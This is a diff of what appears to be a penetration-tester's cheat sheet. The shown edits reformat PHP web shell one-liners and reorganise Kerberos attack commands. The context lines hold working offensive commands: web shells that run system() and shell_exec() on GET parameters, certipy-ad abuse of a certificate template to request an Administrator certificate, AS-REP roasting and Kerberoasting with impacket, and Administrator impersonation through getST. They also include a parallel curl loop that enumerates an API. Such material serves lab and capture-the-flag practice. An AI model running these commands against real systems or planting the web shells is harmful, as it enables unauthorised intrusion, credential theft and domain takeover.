@@ -130,7 +130,8 @@ cat 000-500 | xargs -P 30 -I{} sh -c 'curl https://api.app.com/workplaces/{} -H 
 
 [*] Web Shell
 +---------- One Liners ----------+
-PHP   <?=`$_GET[cmd]`?>
+PHP
+       <?=`$_GET[cmd]`?>
       <?php system($_GET['cmd']); ?>
       <?php passthru($_GET['cmd']); ?>
       <?php shell_exec($_GET['cmd']); ?>
@@ -506,16 +507,20 @@ certipy-ad find -dc-ip $TARGET -target $DC -u '$USERNAME' -p '$PASSWORD' -vulner
 certipy-ad req -dc-ip $TARGET -target $DC -u '$USERNAME' -p '$PASSWORD' -ca '$CA' -upn 'Administrator' -template 'RetroClients' -key-size '4096'
 
 [*] (88) Kerberos
-+---------- .Ccache ----------+
++---------- Clock skew ----------+
+ sudo ntpdate -u $TARGET
+
++---------- .Ccache Guest ----------+
+impacket-getTGT -dc-ip $TARGET '$DOM'/'Guest' -no-pass
 export KRB5CCNAME="$PWD/Guest.ccache"; chmod 0600 "$KRB5CCNAME"
 impacket-describeTicket Guest.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs
 
++---------- .Ccache Username ----------+
+impacket-getTGT -dc-ip $TARGET '$DOM'/'$USERNAME':'$PASSWORD'
 export KRB5CCNAME="$PWD/$USERNAME.ccache"; chmod 0600 "$KRB5CCNAME"
 impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs
 
 +---------- Kerberos Negotiation ----------+
-impacket-getTGT -dc-ip $TARGET '$DOM'/'Guest' -no-pass
-impacket-getTGT -dc-ip $TARGET '$DOM'/'$USERNAME':'$PASSWORD'
 impacket-getTGT -dc-ip $TARGET -hashes :$(echo '$PASSWORD' | 2ntlm) $DOM/$USERNAME
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request
@@ -529,8 +534,6 @@ while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetU
 impacket-getST -dc-ip $TARGET -u2u -impersonate "Administrator" -spn "host/$DC" '$DOM'/'$USERNAME' -k -no-pass 2>/dev/null
 
 +---------- NTLM Negotiation ----------+
-impacket-getTGT -dc-ip $TARGET '$DOM'/'Guest' -no-pass
-impacket-getTGT -dc-ip $TARGET '$DOM'/'$USERNAME':'$PASSWORD'
 impacket-getTGT -dc-ip $TARGET -hashes :$(echo '$PASSWORD' | 2ntlm) $DOM/$USERNAME
 impacket-findDelegation -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'
 impacket-GetNPUsers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -usersfile usernames
